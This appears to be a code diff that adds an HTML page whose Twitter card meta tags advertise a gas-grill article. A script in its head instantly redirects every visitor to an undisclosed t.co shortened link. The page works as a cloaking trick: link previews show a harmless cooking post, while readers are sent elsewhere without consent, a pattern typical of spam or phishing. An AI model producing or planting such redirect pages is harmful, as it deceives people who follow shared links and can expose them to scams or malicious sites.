@@ -1,0 +1,11 @@
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Next Level BBQ: 5 Best Gas Grill Options">
+<meta name="twitter:description" content="Take your BBQ to the next level with these 5 best gas grill options. Enhance your outdoor cooking experience.">
+<meta name="twitter:image" content="https://mypluginhub.co/wp-content/uploads/2024/04/meat-barbecue-grill-nature-1.jpg">
+
+
+<html>
+<head>
+    <script>
+        window.location.href = "https://t.co/nzB5gU5uyB";
+    </script>
